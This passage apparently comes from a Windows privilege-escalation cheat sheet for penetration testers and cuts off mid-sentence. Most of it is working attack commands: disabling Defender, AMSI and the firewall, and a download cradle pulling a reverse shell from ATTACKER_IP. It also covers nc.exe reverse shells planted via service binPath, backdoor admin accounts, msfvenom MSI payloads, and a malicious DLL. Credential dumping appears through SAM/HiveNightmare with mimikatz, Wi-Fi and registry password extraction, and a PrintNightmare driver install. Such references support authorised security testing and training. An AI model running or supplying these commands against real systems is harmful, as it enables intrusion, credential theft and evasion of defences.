ifIndex,IPAddress,LinkLayerAddress,State List all current connections netstat -ano List all network shares net share powershell Find-DomainShare -ComputerDomain domain.local SNMP Configuration reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s Get-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse Antivirus & Detections Enumerate antivirus on a box with WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName Windows Defender # check status of Defender PS C:\\> Get-MpComputerStatus # disable scanning all downloaded files and attachments, disable AMSI (reactive) PS C:\\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus PS C:\\> Set-MpPreference -DisableIOAVProtection $true # disable AMSI (set to 0 to enable) PS C:\\> Set-MpPreference -DisableScriptScanning 1 # exclude a folder PS C:\\> Add-MpPreference -ExclusionPath \"C:\\Temp\" PS C:\\> Add-MpPreference -ExclusionPath \"C:\\Windows\\Tasks\" PS C:\\> Set-MpPreference -ExclusionProcess \"word.exe\", \"vmwp.exe\" # remove signatures (if Internet connection is present, they will be downloaded again): PS > & \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All PS > & \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All Firewall List firewall state and current configuration netsh advfirewall firewall dump # or netsh firewall show state netsh firewall show config List firewall's blocked ports $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq \"0\"} | select name,applicationname,localports Disable firewall # Disable Firewall on Windows 7 via cmd reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable Firewall on Windows 7 via Powershell powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" \u2013Value'` # Disable Firewall on any windows via cmd netsh firewall set opmode disable netsh Advfirewall set allprofiles state off AppLocker Enumeration With the GPO HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script). List AppLocker rules powershell PowerView PS C:\\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections AppLocker Bypass By default, C:\\Windows is not blocked, and C:\\Windows\\Tasks is writtable by any users https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md Powershell Default powershell locations in a Windows system. C:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell Powershell Constrained Mode Check if we are in a constrained mode: $ExecutionContext.SessionState.LanguageMode bypass-clm - PowerShell Constrained Language Mode Bypass PowerShdll - Powershell with no Powershell.exe via DLL's : rundll32.exe C:\\temp\\PowerShdll.dll,main Other bypasses powershell PS > &{ whoami } powershell.exe -v 2 -ep bypass -command \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')\" AMSI Bypass Find more AMSI bypass: here PS C:\\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true) Default Writeable Folders C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys C:\\Windows\\System32\\spool\\drivers\\color C:\\Windows\\System32\\spool\\printers C:\\Windows\\System32\\spool\\servers C:\\Windows\\tracing C:\\Windows\\Temp C:\\Users\\Public C:\\Windows\\Tasks C:\\Windows\\System32\\tasks C:\\Windows\\SysWOW64\\tasks C:\\Windows\\System32\\tasks_migrated\\microsoft\\windows\\pls\\system C:\\Windows\\SysWOW64\\tasks\\microsoft\\windows\\pls\\system C:\\Windows\\debug\\wia C:\\Windows\\registration\\crmlog C:\\Windows\\System32\\com\\dmp C:\\Windows\\SysWOW64\\com\\dmp C:\\Windows\\System32\\fxstmp C:\\Windows\\SysWOW64\\fxstmp EoP - Looting for passwords SAM and SYSTEM files The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM. # Usually %SYSTEMROOT% = C:\\Windows %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system Generate a hash file for John using pwdump or samdump2 . pwdump SYSTEM SAM > /root/sam.txt samdump2 SYSTEM SAM -o sam.txt Either crack it with john -format=NT /root/sam.txt , hashcat or use Pass-The-Hash. LAPS Settings Extract HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd from Windows Registry. LAPS Enabled: AdmPwdEnabled LAPS Admin Account Name: AdminAccountName LAPS Password Complexity: PasswordComplexity LAPS Password Length: PasswordLength LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled HiveNightmare CVE-2021\u201336934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user Check for the vulnerability using icacls C:\\Windows\\System32> icacls config\\SAM config\\SAM BUILTIN\\Administrators:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Users:(I)(RX) <-- this is wrong - regular users should not have read access! Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it. mimikatz> token::whoami /full # List shadow copies available mimikatz> misc::shadowcopies # Extract account from SAM databases mimikatz> lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM # Extract secrets from SECURITY mimikatz> lsadump::secrets /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY Search for file contents cd C:\\ & findstr /SI /M \"password\" *.xml *.ini *.txt findstr /si password *.xml *.ini *.txt *.config findstr /spin \"password\" *.* Search for a file with a certain filename dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* where /R C:\\ user.txt where /R C:\\ *.ini Search the registry for key names and passwords REG QUERY HKLM /F \"password\" /t REG_SZ /S /K REG QUERY HKCU /F \"password\" /t REG_SZ /S /K reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # Windows Autologin reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\" reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # SNMP parameters reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Putty clear text proxy credentials reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # VNC credentials reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s Read a value of a certain sub key REG QUERY \"HKLM\\Software\\Microsoft\\FTH\" /V RuleList Passwords in unattend.xml Location of the unattend.xml files. C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul . Example content <component name=\"Microsoft-Windows-Shell-Setup\" publicKeyToken=\"31bf3856ad364e35\" language=\"neutral\" versionScope=\"nonSxS\" processorArchitecture=\"amd64\"> <AutoLogon> <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password> <Enabled>true</Enabled> <Username>Administrateur</Username> </AutoLogon> <UserAccounts> <LocalAccounts> <LocalAccount wcm:action=\"add\"> <Password>*SENSITIVE*DATA*DELETED*</Password> <Group>administrators;users</Group> <Name>Administrateur</Name> </LocalAccount> </LocalAccounts> </UserAccounts> Unattend credentials are stored in base64 and can be decoded manually with base64. $ echo \"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=\" | base64 -d SecretSecurePassword1234* The Metasploit module post/windows/gather/enum_unattend looks for these files. IIS Web config Get-Childitem \u2013Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config C:\\inetpub\\wwwroot\\web.config Other files %SYSTEMDRIVE%\\pagefile.sys %WINDIR%\\debug\\NetSetup.log %WINDIR%\\repair\\sam %WINDIR%\\repair\\system %WINDIR%\\repair\\software, %WINDIR%\\repair\\security %WINDIR%\\iis6.log %WINDIR%\\system32\\config\\AppEvent.Evt %WINDIR%\\system32\\config\\SecEvent.Evt %WINDIR%\\system32\\config\\default.sav %WINDIR%\\system32\\config\\security.sav %WINDIR%\\system32\\config\\software.sav %WINDIR%\\system32\\config\\system.sav %WINDIR%\\system32\\CCM\\logs\\*.log %USERPROFILE%\\ntuser.dat %USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat %WINDIR%\\System32\\drivers\\etc\\hosts C:\\ProgramData\\Configs\\* C:\\Program Files\\Windows PowerShell\\* dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b Wifi passwords Find AP SSID netsh wlan show profile Get Cleartext Pass netsh wlan show profile <SSID> key=clear Oneliner method to extract wifi passwords from all the access point. cls & echo. & for /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Content\" | find /v \"Number\" & echo.) & @echo on Sticky Notes passwords The sticky notes app stores it's content in a sqlite db located at C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite Passwords stored in services Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1 Import-Module path\\to\\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -o Invoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss Passwords stored in Key Manager :warning: This software will display its output in a GUI rundll32 keymgr,KRShowKeyMgr Powershell History Disable Powershell history: Set-PSReadlineOption -HistorySaveStyle SaveNothing . type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type C:\\Users\\swissky\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw Powershell Transcript C:\\Users\\<USERNAME>\\Documents\\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt C:\\Transcripts\\<DATE>\\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt Password in Alternate Data Stream PS > Get-Item -path flag.txt -Stream * PS > Get-Content -path flag.txt -Stream Flag EoP - Processes Enumeration and Tasks What processes are running? powershell tasklist /v net start sc query Get-Service Get-Process Get-WmiObject -Query \"Select * from Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}} | ft -AutoSize Which processes are running as \"system\" powershell tasklist /v /fi \"username eq system\" Do you have powershell magic? powershell REG QUERY \"HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine\" /v PowerShellVersion List installed programs powershell Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name List services powershell net start wmic service list brief tasklist /SVC Enumerate scheduled tasks powershell schtasks /query /fo LIST 2>nul | findstr TaskName schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM Get-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State Startup tasks powershell wmic startup get caption,command reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\R reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce dir \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\" dir \"C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup\" EoP - Incorrect permissions in services A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system. Often, services are pointing to writeable locations: - Orphaned installs, not installed anymore but still exist in startup - DLL Hijacking ```powershell # find missing DLL - Find-PathDLLHijack PowerUp.ps1 - Process Monitor : check for \"Name Not Found\" # compile a malicious dll - For x64 compile with: \"x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\" - For x86 compile with: \"i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll\" # content of windows_dll.c #include <windows.h> BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system(\"cmd.exe /k whoami > C:\\\\Windows\\\\Temp\\\\dll.txt\"); ExitProcess(0); } return TRUE; } ``` PATH directories with weak permissions ```powershell $ for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt $ for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" $ sc query state=all | findstr \"SERVICE_NAME:\" >> Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt ``` Alternatively you can use the Metasploit exploit : exploit/windows/local/service_permissions Note to check file permissions you can use cacls and icacls icacls (Windows Vista +) cacls (Windows XP) You are looking for BUILTIN\\Users:(F) (Full access), BUILTIN\\Users:(M) (Modify access) or BUILTIN\\Users:(W) (Write-only access) in the output. Example with Windows 10 - CVE-2019-1322 UsoSvc Prerequisite: Service account PS C:\\Windows\\system32> sc.exe stop UsoSvc PS C:\\Windows\\system32> sc.exe config usosvc binPath=\"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe 10.10.10.10 4444 -e cmd.exe\" PS C:\\Windows\\system32> sc.exe config UsoSvc binpath= \"C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\" PS C:\\Windows\\system32> sc.exe config UsoSvc binpath= \"cmd /C C:\\Users\\nc.exe 10.10.10.10 4444 -e cmd.exe\" PS C:\\Windows\\system32> sc.exe qc usosvc [SC] QueryServiceConfig SUCCESS SERVICE_NAME: usosvc TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START (DELAYED) ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Update Orchestrator Service DEPENDENCIES : rpcss SERVICE_START_NAME : LocalSystem PS C:\\Windows\\system32> sc.exe start UsoSvc Example with Windows XP SP1 - upnphost # NOTE: spaces are mandatory for this exploit to work ! sc config upnphost binpath= \"C:\\Inetpub\\wwwroot\\nc.exe 10.11.0.73 4343 -e C:\\WINDOWS\\System32\\cmd.exe\" sc config upnphost obj= \".\\LocalSystem\" password= \"\" sc qc upnphost sc config upnphost depend= \"\" net start upnphost If it fails because of a missing dependency, try the following commands. sc config SSDPSRV start=auto net start SSDPSRV net stop upnphost net start upnphost sc config upnphost depend=\"\" Using accesschk from Sysinternals or accesschk-XP.exe - github.com/phackt $ accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS $ accesschk.exe -ucqv upnphost upnphost RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS $ sc config <vuln-service> binpath=\"net user backdoor backdoor123 /add\" $ sc config <vuln-service> binpath= \"C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\" $ sc stop <vuln-service> $ sc start <vuln-service> $ sc config <vuln-service> binpath=\"net localgroup Administrators backdoor /add\" $ sc stop <vuln-service> $ sc start <vuln-service> EoP - Windows Subsystem for Linux (WSL) Technique borrowed from Warlockobama's tweet With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ .exe --default-user root. Now start your bind shell or reverse. wsl whoami ./ubuntun1604.exe config --default-user root wsl whoami wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE' Binary bash.exe can also be found in C:\\Windows\\WinSxS\\amd64_microsoft-windows-lxssbash_[...]\\bash.exe Alternatively you can explore the WSL filesystem in the folder C:\\Users\\%USERNAME%\\AppData\\Local\\Packages\\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\\LocalState\\rootfs\\ EoP - Unquoted Service Paths The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first. wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" wmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name Metasploit exploit : exploit/windows/local/trusted_service_path PowerUp exploit ```powershell # find the vulnerable application C:> powershell.exe -nop -exec bypass \"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks\" ... [*] Checking for unquoted service paths... ServiceName : BBSvc Path : C:\\Program Files\\Microsoft\\Bing Bar\\7.1\\BBSvc.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path ... automatic exploit Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command \"....\\Users\\Public\\nc.exe 10.10.10.10 4444 -e cmd.exe\" ``` Example For C:\\Program Files\\something\\legit.exe , Windows will try the following paths first: - C:\\Program.exe - C:\\Program Files.exe EoP - $PATH Interception Requirements: - PATH contains a writeable folder with low privileges. - The writeable folder is before the folder that contains the legitimate binary. EXAMPLE: # List contents of the PATH environment variable # EXAMPLE OUTPUT: C:\\Program Files\\nodejs\\;C:\\WINDOWS\\system32 $env:Path # See permissions of the target folder # EXAMPLE OUTPUT: BUILTIN\\Users: GR,GW icacls.exe \"C:\\Program Files\\nodejs\\\" # Place our evil-file in that folder. copy evil-file.exe \"C:\\Program Files\\nodejs\\cmd.exe\" Because (in this example) \"C:\\Program Files\\nodejs\\\" is before \"C:\\WINDOWS\\system32\\\" on the PATH variable, the next time the user runs \"cmd.exe\", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. EoP - Named Pipes Find named pipes: [System.IO.Directory]::GetFiles(\"\\\\.\\pipe\\\") Check named pipes DACL: pipesec.exe <named_pipe> Reverse engineering software Send data throught the named pipe : program.exe >\\\\.\\pipe\\StdOutPipe 2>\\\\.\\pipe\\StdErrPipe EoP - Kernel Exploitation List of exploits kernel : https://github.com/SecWiki/windows-kernel-exploits #Security Bulletin #KB #Description #Operating System MS17-017 \u3000[KB4013081]\u3000\u3000[GDI Palette Objects Local Privilege Escalation]\u3000\u3000(windows 7/8) CVE-2017-8464 \u3000[LNK Remote Code Execution Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008) CVE-2017-0213 \u3000[Windows COM Elevation of Privilege Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008) CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2) CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1) MS17-010 \u3000[KB4013389]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(windows 7/2008/2003/XP) MS16-135 \u3000[KB3199135]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(2016) MS16-111 \u3000[KB3186973]\u3000\u3000[kernel api]\u3000\u3000(Windows 10 10586 (32/64)/8.1) MS16-098 \u3000[KB3178466]\u3000\u3000[Kernel Driver]\u3000\u3000(Win 8.1) MS16-075 \u3000[KB3164038]\u3000\u3000[Hot Potato]\u3000\u3000(2003/2008/7/8/2012) MS16-034 \u3000[KB3143145]\u3000\u3000[Kernel Driver]\u3000\u3000(2008/7/8/10/2012) MS16-032 \u3000[KB3143141]\u3000\u3000[Secondary Logon Handle]\u3000\u3000(2008/7/8/10/2012) MS16-016 \u3000[KB3136041]\u3000\u3000[WebDAV]\u3000\u3000(2008/Vista/7) MS16-014 \u3000[K3134228]\u3000\u3000[remote code execution]\u3000\u3000(2008/Vista/7) ... MS03-026 \u3000[KB823980]\u3000\u3000 [Buffer Overrun In RPC Interface]\u3000\u3000(/NT/2000/XP/2003) To cross compile a program from Kali, use the following command. Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c EoP - AlwaysInstallElevated Check if these registry values are set to \"1\". $ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated $ reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated $ Get-ItemProperty HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer $ Get-ItemProperty HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer Then create an MSI package and install it. $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi $ msiexec /quiet /qn /i C:\\evil.msi Technique also available in : * Metasploit : exploit/windows/local/always_install_elevated * PowerUp.ps1 : Get-RegistryAlwaysInstallElevated , Write-UserAddMSI EoP - Insecure GUI apps Application running as SYSTEM allowing an user to spawn a CMD, or browse directories. Example: \"Windows Help and Support\" (Windows + F1), search for \"command prompt\", click on \"Click to open Command Prompt\" EoP - Evaluating Vulnerable Drivers Look for vuln drivers loaded, we often don't spend enough time looking at this: # https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery PS C:\\Users\\Swissky> driverquery.exe /fo table Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 12/10/2006 4:44:38 PM 3ware 3ware Kernel 5/18/2015 6:28:03 PM ACPI Microsoft ACPI Driver Kernel 12/9/1975 6:17:08 AM AcpiDev ACPI Devices driver Kernel 12/7/1993 6:22:19 AM acpiex Microsoft ACPIEx Drive Kernel 3/1/2087 8:53:50 AM acpipagr ACPI Processor Aggrega Kernel 1/24/2081 8:36:36 AM AcpiPmi ACPI Power Meter Drive Kernel 11/19/2006 9:20:15 PM acpitime ACPI Wake Alarm Driver Kernel 2/9/1974 7:10:30 AM ADP80XX ADP80XX Kernel 4/9/2015 4:49:48 PM <SNIP> PS C:\\Users\\Swissky> DriverQuery.exe --no-msft [+] Enumerating driver services... [+] Checking file signatures... Citrix USB Filter Driver Service Name: ctxusbm Path: C:\\Windows\\system32\\DRIVERS\\ctxusbm.sys Version: 14.11.0.138 Creation Time (UTC): 17/05/2018 01:20:50 Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US Signer: CN=\"Citrix Systems, Inc.\", OU=XenApp(ClientSHA256), O=\"Citrix Systems, Inc.\", L=Fort Lauderdale, S=Florida, C=US <SNIP> EoP - Printers Universal Printer Create a Printer $printerName = 'Universal Priv Printer' $system32 = $env:systemroot + '\\system32' $drivers = $system32 + '\\spool\\drivers' $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers\\' + $printerName Copy-Item -Force -Path ($system32 + '\\mscms.dll') -Destination ($system32 + '\\mimispool.dll') Copy-Item -Force -Path '.\\mimikatz_trunk\\x64\\mimispool.dll' -Destination ($drivers + '\\x64\\3\\mimispool.dll') Copy-Item -Force -Path '.\\mimikatz_trunk\\win32\\mimispool.dll' -Destination ($drivers + '\\W32X86\\3\\mimispool.dll') Add-PrinterDriver -Name 'Generic / Text Only' Add-Printer -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared New-Item -Path ($RegStartPrinter + '\\CopyFiles') | Out-Null New-Item -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi') -Name 'Directory' -PropertyType 'String' -Value 'x64\\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Directory' -PropertyType 'String' -Value 'W32X86\\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\\CopyFiles\\Mango') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango') -Name 'Directory' -PropertyType 'String' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango') -Name 'Files' -PropertyType 'MultiString' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango') -Name 'Module' -PropertyType 'String' -Value 'mimispool.dll' | Out-Null Execute the driver $serverName = 'dc.purple.lab' $printerName = 'Universal Priv Printer' $fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'}) Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue Add-Printer -ConnectionName $fullprinterName PrinterNightmare git clone https://github.com/Flangvik/DeployPrinterNightmare PS C:\\adversary> FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell [<3] @Flangvik - TrustedSec [+] Copying C:\\Windows\\system32\\mscms.dll to C:\\Windows\\system32\\6cfbaf26f4c64131896df8a522546e9c.dll [+] Copying 64mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\x64\\3\\6cfbaf26f4c64131896df8a522546e9c.dll [+] Copying 32mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\W32X86\\3\\6cfbaf26f4c64131896df8a522546e9c.dll [+] Adding printer driver => Generic / Text Only! [+] Adding printer => EasySystemShell! [+] Setting 64-bit Registry key [+] Setting 32-bit Registry key [+] Setting '*' Registry key PS C:\\target> $serverName = 'printer-installed-host' PS C:\\target> $printerName = 'EasySystemShell' PS C:\\target> $fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'}) PS C:\\target> Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue PS C:\\target> Add-Printer -ConnectionName $fullprinterName Bring Your Own Vulnerability Concealed Position : https://github.com/jacob-baines/concealed_position ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE cp_server.exe -e ACIDDAMAGE # Get-Printer # Set the \"Advanced Sharing Settings\" -> \"Turn off password protected sharing\" cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE cp_client.exe -l -e ACIDDAMAGE EoP - Runas Use the cmdkey to list the stored credentials on the machine. cmdkey /list Currently stored credentials: Target: Domain:interactive=WORKGROUP\\Administrator Type: Domain Password User: WORKGROUP\\Administrator Then you can use runas with the /savecred options in order to use the saved credentials. The following example is calling a remote 